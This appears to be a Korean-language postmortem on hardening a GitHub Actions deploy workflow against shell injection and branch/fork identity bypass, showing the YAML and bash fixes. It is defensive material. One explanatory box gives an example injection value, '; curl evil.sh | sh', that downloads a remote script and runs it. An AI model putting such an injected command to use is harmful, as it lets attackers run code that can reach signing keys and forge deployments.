# issue1 — deploy.yml 입력 하드닝: 리뷰가 찾은 세 겹의 구멍

- 원본 PR: core #2 (이슈 #1) · devlog: `jun-bank/core/docs/devlog/pr-02-cd-hardening.md`

---

## 1. 무엇이 문제였나

core의 배포 워크플로(`deploy.yml`)에 셸 주입·신원 우회 취약점 세 건이 서 있었다.\
이 결함은 코드를 짜다 나온 게 아니라 **리뷰에서 태어났다** — gateway의 CD를 만들 때 core의 deploy.yml을 원형으로 복제했는데, 그 복제본을 리뷰에 넣었더니 원형 자체의 결함이 드러났다.\
결함이 두 repo에 똑같이 서 있었으므로 수정도 두 repo에 동시에 갔고, core 쪽 수정을 이슈·PR 정합으로 닫으려 이슈 #1이 사후 생성됐다.

세 구멍은 이렇다.

**첫째, 셸 주입.**\
`${{ github.event.inputs.sha }}` 같은 GitHub Actions 표현식을 `run:` 스크립트 본문에 직접 보간하고 있었다.\
이 스텝의 환경에는 배포 서명 키(HMAC)와 OIDC 토큰 발급 권한이 있어서, 입력 sha 한 칸이 서명 키까지 닿는 경로였다.

> **표현식 보간** — GitHub Actions가 `${{ ... }}` 를 스크립트 문자열에 **미리 치환**해 넣는 것.\
> 보간은 셸이 스크립트를 읽기 전에 문자열 치환으로 일어나므로, 사용자가 입력 칸에 넣은 문자열이 그대로 셸 명령이 된다.\
> 예: sha 칸에 `; curl evil.sh | sh` 를 넣으면 그 문자열이 명령줄에 그대로 붙는다.

> **HMAC / OIDC 토큰** — HMAC은 요청에 붙이는 대칭키 서명, OIDC 토큰은 "이 요청이 정말 core repo의 main에서 나왔다"를 증명하는 신원 증명서.\
> 이 둘이 있으면 배포 엣지가 요청을 신뢰하므로, 입력 한 칸이 여기 닿으면 배포 자체를 위조할 수 있다.

**둘째, 브랜치 미검증.**\
배포 요청 워크플로는 빌드 워크플로의 `workflow_run` 성공을 트리거로 도는데, 가드가 `conclusion == 'success'` 만 봤다.\
빌드는 아무 브랜치에서나 수동으로 돌릴 수 있고, 그때도 배포 워크플로는 기본 브랜치 컨텍스트로 실행된다.\
결과적으로 main이 아닌 브랜치의 이미지가 main 신원의 OIDC 토큰을 달고 배포 요청이 될 수 있었다.

> **workflow_run** — 다른 워크플로가 끝나면 그걸 신호로 자동으로 도는 트리거.\
> 예: `build-and-push`가 성공하면 `deploy-request`가 이어서 돈다 — 문제는 "어느 브랜치의 성공인가"를 안 보면 아무 성공이나 배포로 이어진다는 것.

**셋째, fork 변종.**\
브랜치 이름 검사를 추가해도, fork에서 온 빌드의 `head_branch` 는 fork 쪽 이름이다.\
공격자가 자기 fork의 브랜치를 "main"으로 지으면 이름 검사를 통과하고, 그때 워크플로는 우리 쪽 시크릿과 신원으로 돈다 — 남의 커밋이 우리 이름으로 배포 요청이 되는 셈이다.

## 2. 무엇을 고민했나

방어를 어디서 끊느냐를 두 축에서 저울질했다. 안 고른 안도 함께 남긴다.

**주입 방어 — 형식 검사만으로 될까.**\
가장 손쉬운 후보는 입력 sha에 형식 검사(40자리 hex)만 거는 것이었다.\
하지만 이것만으로는 못 막는다 — 보간은 셸이 스크립트를 읽기 **전에** 일어나므로, 검사 코드가 도는 시점엔 이미 주입 문자열이 셸 명령으로 확정돼 있다.\
그래서 형식 검사는 주입의 방어선이 될 수 없고, **값이 셸 파서에 도달하기 전에 끊는** 것이 먼저여야 한다는 결론이 나왔다.

**신원 방어 — 어느 조건 하나로 충분한가.**\
가드 조건을 하나씩 후보로 놓고 각각이 뚫리는 지점을 봤다.

- `conclusion == 'success'` 하나 → 아무 브랜치의 빌드나 통과(둘째 구멍).
- `+ 브랜치 이름 == main` → fork가 자기 브랜치를 "main"으로 지으면 통과(셋째 구멍).
- `+ 이벤트가 push` `+ head_repository == 우리 repo` → fork·수동 트리거를 함께 걸러야 닫힌다.

어느 조건도 단독으로는 충분하지 않았고, **뚫리는 지점을 발견할 때마다 조건을 쌓는** 방향이 됐다.

## 3. 그래서 이렇게

주입은 **표현식 보간을 전부 `env:` 로 옮기고 셸에서는 인용된 변수만** 쓰는 방식으로 끊었다.\
그 위에 형식 검증을 한 층 더 얹었다 — 인용이 주입을 막고, 형식 검사는 쓰레기 값이 이미지 태그·manifest·서명까지 흘러가는 것을 막는다는 **역할 분리**다.\
신원 우회는 발견 순서대로 조건을 쌓아 **4항 AND 가드**가 됐다.

```text
[ 주입 방어 — 값을 셸 파서 앞에서 끊는다 ]

수정 전:  입력 sha ──직접 보간──> run: 셸 본문 ──> 명령 실행
                                        (서명키 HMAC · OIDC 토큰 노출)

수정 후:  입력 sha ──> env: INPUT_SHA ──> 셸에서 "$SHA" (인용만)
                                              ↓
                                형식 검사  ^[0-9a-f]{40}$
                                              ↓
                            통과한 값만  태그 · manifest · 서명 으로

[ 신원 방어 — 조건을 쌓아 4항 AND ]

성공?         ──┐
이벤트=push?   ──┤
head_repo=우리?──┼── 전부 참이어야  배포 요청 허용
head_branch=   ──┘   (하나라도 거짓이면 거절)
  default_branch?
```

세로 흐름 해설.\
주입 축은 "보간을 env로 격리 → 셸은 인용 변수만 → 형식 검사 → 통과값만 하류로"의 4단계로, 값이 명령이 되는 길을 원천에서 끊고 형식으로 한 번 더 조인다.\
신원 축은 네 조건의 AND라, 수동 트리거·타 브랜치·fork 중 하나라도 걸리면 배포 요청 자체가 서지 않는다.

## 4. 코드 — 실제 커밋에서

> jun-bank는 git repo가 아니라 PR 번호로만 대조한다. 좌표는 devlog가 박아 둔 파일:줄이다.

주입은 보간을 `env:` 로 옮겨 격리한다.

```yaml
# .github/workflows/deploy.yml:74-81
# ⚠️ 표현식 보간값은 셸 스크립트 본문에 직접 넣지 않는다 — 보간은 셸이 읽기 전에
#    일어나므로 사용자가 넣은 문자열이 그대로 명령이 된다(입력 sha 한 칸으로
#    AGENT_HMAC_KEY·OIDC 토큰까지 닿는다). env로 넘기고 셸에서는 "$VAR"만 쓴다.
env:
  EVENT_NAME: ${{ github.event_name }}
  INPUT_SHA: ${{ github.event.inputs.sha }}
```

그 위에 값 자체의 형식 검증을 두 번째 층으로 얹는다.

```bash
# 같은 파일 :91-96 — 값 자체의 검증(두 번째 층)
if [[ ! "$SHA" =~ ^[0-9a-f]{40}$ ]]; then
  echo "::error::배포 대상 SHA 형식 오류(40자리 소문자 hex 아님): '$SHA'"
  exit 1
fi
```

신원 가드는 발견 순서 그대로 쌓인 4항 AND다.

```yaml
# 같은 파일 :56-61 — 4항 AND 가드
if: >-
  github.event_name == 'workflow_dispatch' ||
  (github.event.workflow_run.conclusion == 'success' &&
   github.event.workflow_run.event == 'push' &&
   github.event.workflow_run.head_repository.full_name == github.repository &&
   github.event.workflow_run.head_branch == github.event.repository.default_branch)
```

이 파일의 주석에는 왜 4항인지가 발견 순서 그대로 남아 있다 — "성공 여부만으로는 부족하다", "브랜치 이름만으로는 또 부족하다".\
코드가 곧 사건 기록인 셈이다.

## 5. 구현 중 마주친 문제

리뷰가 이 PR을 두 번 되돌렸다.\
1차 수정에는 fork 가드가 없었는데, 2차 리뷰가 `head_repository` 우회(셋째 구멍)를 지적해 조건 두 개(`event == 'push'` · `head_repository == 우리 repo`)가 뒤늦게 추가됐다.\
"브랜치 이름만 검사하면 충분하다"고 봤던 1차 판단이 틀렸음이 리뷰에서 드러난 것이다.

정직한 이연도 하나 남았다.\
GitHub 표현식과 `workflow_run` 페이로드는 로컬에서 재현할 수 없으므로, 하드닝된 워크플로 자체의 실행은 머지 후 첫 배포가 검증한다고 PR 본문에 명시했다.

---

## 6. 결론

지금 상태 — 주입은 env 격리+형식 검사 2층으로, 신원 우회는 4항 AND 가드로 닫혔다.\
로컬에서 못 돌리는 이연은 머지 후 첫 실배포(4항 가드 통과, HTTP 200)로 해소됐다.\
이 수정은 gateway의 신규 CD(gateway#4)와 한 쌍으로 발행됐다 — 같은 계약이 두 repo에 서 있으므로.

남은 빚·경계.\
이 가드는 CD층 방어일 뿐이고, 정본 검증은 agent의 OIDC claim 행렬과 repo↔target allowlist다(infra#29).\
운영 한계도 하나 기록됐다 — 기본 브랜치를 개명하면 agent 쪽 `OIDC_JOB_WORKFLOW_REF` 설정을 동시에 갱신해야 한다.
